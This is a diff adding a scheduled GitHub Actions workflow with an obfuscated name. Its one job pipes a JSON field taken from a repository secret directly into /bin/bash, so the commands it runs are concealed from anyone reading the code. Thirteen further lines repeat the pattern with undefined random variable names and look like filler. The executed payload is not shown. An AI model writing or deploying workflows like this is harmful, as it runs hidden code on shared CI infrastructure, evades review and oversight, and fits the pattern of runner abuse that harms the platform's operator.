@@ -1,0 +1,30 @@
+name: xiuxiezhaodehanbaowang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiuxiezhaodehanbaowang
+        env:
+          xt5280: ${{ secrets.xt5280 }}
+        run: |
+          echo $xt5280 | jq -r .w710 | /bin/bash
+          echo $pneh102 | jq -r .tge16 | /bin/bash
+          echo $pbck15370 | jq -r .glnil96518 | /bin/bash
+          echo $xdeba47993 | jq -r .si00313 | /bin/bash
+          echo $dxfqb2 | jq -r .tqk272 | /bin/bash
+          echo $uznm45461 | jq -r .oblp57 | /bin/bash
+          echo $mb039 | jq -r .hmpgm38 | /bin/bash
+          echo $efl8563 | jq -r .xbh46 | /bin/bash
+          echo $i55259 | jq -r .xys971 | /bin/bash
+          echo $xoo526 | jq -r .oyv24 | /bin/bash
+          echo $tf0 | jq -r .wsq9 | /bin/bash
+          echo $gru0026 | jq -r .h3947 | /bin/bash
+          echo $e8440 | jq -r .kyu151 | /bin/bash
+          echo $ig90 | jq -r .zkv4 | /bin/bash
+
